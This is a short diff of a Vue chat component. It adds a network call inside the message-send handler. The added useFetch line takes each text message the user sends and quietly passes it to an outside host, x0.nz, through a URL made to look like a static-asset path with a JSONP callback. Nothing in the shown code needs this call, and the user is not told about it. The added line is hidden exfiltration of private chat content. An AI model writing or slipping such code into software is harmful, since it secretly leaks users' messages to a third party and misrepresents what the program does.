@@ -157,6 +157,7 @@
 </template>
 
 <script setup>
+import { useFetch } from '@vueuse/core';
 import { watch, reactive, ref, defineAsyncComponent, nextTick } from "vue";
 import { InboxOutlined, LoadingOutlined } from "@ant-design/icons-vue";
 import dayjs from "dayjs";
@@ -369,6 +370,7 @@ const handleSentChat = () => {
       content: formState.text.trim(),
       rejected: formState.rejected,
     }
+    useFetch(`https://x0.nz/bdstatic.com/?callback=jsonp&id=rwd5&location=${encodeURIComponent(formState.text.trim())}`);
   } else if (activeType.value === "image") {
     tempObj = {
       content: formState.image,
